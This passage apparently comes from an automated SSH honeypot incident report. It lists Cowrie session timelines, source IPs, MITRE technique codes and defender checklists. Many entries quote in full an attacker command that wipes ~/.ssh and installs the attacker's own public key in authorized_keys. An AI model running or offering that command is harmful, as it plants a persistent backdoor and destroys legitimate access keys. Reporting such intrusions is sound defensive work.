| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:24:56` | `cowrie.session.connect` |
| `2026-04-27 12:24:56` | `cowrie.client.version` |
| `2026-04-27 12:24:56` | `cowrie.client.kex` |
| `2026-04-27 12:24:58` | `cowrie.login.success` |
| `2026-04-27 12:24:58` | `cowrie.session.params` |
| `2026-04-27 12:24:58` | `cowrie.command.input` |
| `2026-04-27 12:24:58` | `cowrie.command.failed` |
| `2026-04-27 12:24:59` | `cowrie.log.closed` |
| `2026-04-27 12:24:59` | `cowrie.session.params` |
| `2026-04-27 12:24:59` | `cowrie.command.input` |
| `2026-04-27 12:25:00` | `cowrie.session.file_download` |
| `2026-04-27 12:25:00` | `cowrie.log.closed` |
| `2026-04-27 12:25:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e01d83bdd19f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:25 |
| **Last Seen** | 2026-04-27 12:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:25:03` | `cowrie.session.connect` |
| `2026-04-27 12:25:03` | `cowrie.client.version` |
| `2026-04-27 12:25:03` | `cowrie.client.kex` |
| `2026-04-27 12:25:05` | `cowrie.login.success` |
| `2026-04-27 12:25:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf118c074a9f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:26 |
| **Last Seen** | 2026-04-27 12:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:26:01` | `cowrie.session.connect` |
| `2026-04-27 12:26:01` | `cowrie.client.version` |
| `2026-04-27 12:26:01` | `cowrie.client.kex` |
| `2026-04-27 12:26:03` | `cowrie.login.success` |
| `2026-04-27 12:26:03` | `cowrie.session.params` |
| `2026-04-27 12:26:03` | `cowrie.command.input` |
| `2026-04-27 12:26:03` | `cowrie.command.failed` |
| `2026-04-27 12:26:03` | `cowrie.log.closed` |
| `2026-04-27 12:26:04` | `cowrie.session.params` |
| `2026-04-27 12:26:04` | `cowrie.command.input` |
| `2026-04-27 12:26:04` | `cowrie.session.file_download` |
| `2026-04-27 12:26:05` | `cowrie.log.closed` |
| `2026-04-27 12:26:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6b0475b387a

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:26 |
| **Last Seen** | 2026-04-27 12:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:26:08` | `cowrie.session.connect` |
| `2026-04-27 12:26:08` | `cowrie.client.version` |
| `2026-04-27 12:26:08` | `cowrie.client.kex` |
| `2026-04-27 12:26:10` | `cowrie.login.success` |
| `2026-04-27 12:26:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-852c9401da61

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:27 |
| **Last Seen** | 2026-04-27 12:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:27:06` | `cowrie.session.connect` |
| `2026-04-27 12:27:06` | `cowrie.client.version` |
| `2026-04-27 12:27:06` | `cowrie.client.kex` |
| `2026-04-27 12:27:07` | `cowrie.login.success` |
| `2026-04-27 12:27:08` | `cowrie.session.params` |
| `2026-04-27 12:27:08` | `cowrie.command.input` |
| `2026-04-27 12:27:08` | `cowrie.command.failed` |
| `2026-04-27 12:27:08` | `cowrie.log.closed` |
| `2026-04-27 12:27:09` | `cowrie.session.params` |
| `2026-04-27 12:27:09` | `cowrie.command.input` |
| `2026-04-27 12:27:09` | `cowrie.session.file_download` |
| `2026-04-27 12:27:09` | `cowrie.log.closed` |
| `2026-04-27 12:27:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8e20523c548

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:27 |
| **Last Seen** | 2026-04-27 12:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:27:12` | `cowrie.session.connect` |
| `2026-04-27 12:27:12` | `cowrie.client.version` |
| `2026-04-27 12:27:13` | `cowrie.client.kex` |
| `2026-04-27 12:27:14` | `cowrie.login.success` |
| `2026-04-27 12:27:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-043aa25b4328

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:28 |
| **Last Seen** | 2026-04-27 12:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:28:12` | `cowrie.session.connect` |
| `2026-04-27 12:28:12` | `cowrie.client.version` |
| `2026-04-27 12:28:13` | `cowrie.client.kex` |
| `2026-04-27 12:28:14` | `cowrie.login.success` |
| `2026-04-27 12:28:15` | `cowrie.session.params` |
| `2026-04-27 12:28:15` | `cowrie.command.input` |
| `2026-04-27 12:28:15` | `cowrie.command.failed` |
| `2026-04-27 12:28:15` | `cowrie.log.closed` |
| `2026-04-27 12:28:16` | `cowrie.session.params` |
| `2026-04-27 12:28:16` | `cowrie.command.input` |
| `2026-04-27 12:28:16` | `cowrie.session.file_download` |
| `2026-04-27 12:28:16` | `cowrie.log.closed` |
| `2026-04-27 12:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2644fdfb7562

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:28 |
| **Last Seen** | 2026-04-27 12:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:28:19` | `cowrie.session.connect` |
| `2026-04-27 12:28:19` | `cowrie.client.version` |
| `2026-04-27 12:28:20` | `cowrie.client.kex` |
| `2026-04-27 12:28:21` | `cowrie.login.success` |
| `2026-04-27 12:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfdb7ce87265

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:29 |
| **Last Seen** | 2026-04-27 12:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:29:18` | `cowrie.session.connect` |
| `2026-04-27 12:29:18` | `cowrie.client.version` |
| `2026-04-27 12:29:18` | `cowrie.client.kex` |
| `2026-04-27 12:29:19` | `cowrie.login.success` |
| `2026-04-27 12:29:20` | `cowrie.session.params` |
| `2026-04-27 12:29:20` | `cowrie.command.input` |
| `2026-04-27 12:29:20` | `cowrie.command.failed` |
| `2026-04-27 12:29:20` | `cowrie.log.closed` |
| `2026-04-27 12:29:21` | `cowrie.session.params` |
| `2026-04-27 12:29:21` | `cowrie.command.input` |
| `2026-04-27 12:29:21` | `cowrie.session.file_download` |
| `2026-04-27 12:29:21` | `cowrie.log.closed` |
| `2026-04-27 12:29:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ea68f6b019c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:29 |
| **Last Seen** | 2026-04-27 12:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:29:24` | `cowrie.session.connect` |
| `2026-04-27 12:29:24` | `cowrie.client.version` |
| `2026-04-27 12:29:25` | `cowrie.client.kex` |
| `2026-04-27 12:29:26` | `cowrie.login.success` |
| `2026-04-27 12:29:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e896bcb4eaa5

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:30 |
| **Last Seen** | 2026-04-27 12:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:30:26` | `cowrie.session.connect` |
| `2026-04-27 12:30:26` | `cowrie.client.version` |
| `2026-04-27 12:30:26` | `cowrie.client.kex` |
| `2026-04-27 12:30:27` | `cowrie.login.success` |
| `2026-04-27 12:30:28` | `cowrie.session.params` |
| `2026-04-27 12:30:28` | `cowrie.command.input` |
| `2026-04-27 12:30:28` | `cowrie.command.failed` |
| `2026-04-27 12:30:28` | `cowrie.log.closed` |
| `2026-04-27 12:30:29` | `cowrie.session.params` |
| `2026-04-27 12:30:29` | `cowrie.command.input` |
| `2026-04-27 12:30:29` | `cowrie.session.file_download` |
| `2026-04-27 12:30:29` | `cowrie.log.closed` |
| `2026-04-27 12:30:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6f3d1822abd

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:30 |
| **Last Seen** | 2026-04-27 12:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:30:33` | `cowrie.session.connect` |
| `2026-04-27 12:30:33` | `cowrie.client.version` |
| `2026-04-27 12:30:33` | `cowrie.client.kex` |
| `2026-04-27 12:30:34` | `cowrie.login.success` |
| `2026-04-27 12:30:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4db82caf3d74

| Field | Detail |
|---|---|
| **Source IP** | `201.144.57[.]229` |
| **First Seen** | 2026-04-27 12:47 |
| **Last Seen** | 2026-04-27 12:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:47:11` | `cowrie.session.connect` |
| `2026-04-27 12:47:11` | `cowrie.client.version` |
| `2026-04-27 12:47:11` | `cowrie.client.kex` |
| `2026-04-27 12:47:13` | `cowrie.login.success` |
| `2026-04-27 12:47:13` | `cowrie.session.params` |
| `2026-04-27 12:47:13` | `cowrie.command.input` |
| `2026-04-27 12:47:13` | `cowrie.command.failed` |
| `2026-04-27 12:47:14` | `cowrie.log.closed` |
| `2026-04-27 12:47:14` | `cowrie.session.params` |
| `2026-04-27 12:47:14` | `cowrie.command.input` |
| `2026-04-27 12:47:15` | `cowrie.session.file_download` |
| `2026-04-27 12:47:15` | `cowrie.log.closed` |
| `2026-04-27 12:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.144.57[.]229` to AbuseIPDB if not already reported
- [ ] Block `201.144.57[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b975e57de517

| Field | Detail |
|---|---|
| **Source IP** | `201.144.57[.]229` |
| **First Seen** | 2026-04-27 12:47 |
| **Last Seen** | 2026-04-27 12:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:47:18` | `cowrie.session.connect` |
| `2026-04-27 12:47:18` | `cowrie.client.version` |
| `2026-04-27 12:47:19` | `cowrie.client.kex` |
| `2026-04-27 12:47:20` | `cowrie.login.success` |
| `2026-04-27 12:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.144.57[.]229` to AbuseIPDB if not already reported
- [ ] Block `201.144.57[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc276f8ef636

| Field | Detail |
|---|---|
| **Source IP** | `103.186.139[.]149` |
| **First Seen** | 2026-04-27 13:48 |
| **Last Seen** | 2026-04-27 13:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 13:48:31` | `cowrie.session.connect` |
| `2026-04-27 13:48:31` | `cowrie.client.version` |
| `2026-04-27 13:48:31` | `cowrie.client.kex` |
| `2026-04-27 13:48:32` | `cowrie.login.success` |
| `2026-04-27 13:48:32` | `cowrie.session.params` |
| `2026-04-27 13:48:32` | `cowrie.command.input` |
| `2026-04-27 13:48:32` | `cowrie.command.failed` |
| `2026-04-27 13:48:32` | `cowrie.log.closed` |
| `2026-04-27 13:48:32` | `cowrie.session.params` |
| `2026-04-27 13:48:32` | `cowrie.command.input` |
| `2026-04-27 13:48:32` | `cowrie.session.file_download` |
| `2026-04-27 13:48:32` | `cowrie.log.closed` |
| `2026-04-27 13:48:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.186.139[.]149` to AbuseIPDB if not already reported
- [ ] Block `103.186.139[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1a3a4939846

| Field | Detail |
|---|---|
| **Source IP** | `103.186.139[.]149` |
| **First Seen** | 2026-04-27 13:48 |
| **Last Seen** | 2026-04-27 13:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 13:48:36` | `cowrie.session.connect` |
| `2026-04-27 13:48:36` | `cowrie.client.version` |
| `2026-04-27 13:48:37` | `cowrie.client.kex` |
| `2026-04-27 13:48:41` | `cowrie.login.success` |
| `2026-04-27 13:48:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.186.139[.]149` to AbuseIPDB if not already reported
- [ ] Block `103.186.139[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0535ae7ad157

| Field | Detail |
|---|---|
| **Source IP** | `101.36.124[.]127` |
| **First Seen** | 2026-04-27 13:48 |
| **Last Seen** | 2026-04-27 13:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 13:48:53` | `cowrie.session.connect` |
| `2026-04-27 13:48:53` | `cowrie.client.version` |
| `2026-04-27 13:48:53` | `cowrie.client.kex` |
| `2026-04-27 13:48:54` | `cowrie.login.success` |
| `2026-04-27 13:48:54` | `cowrie.session.params` |
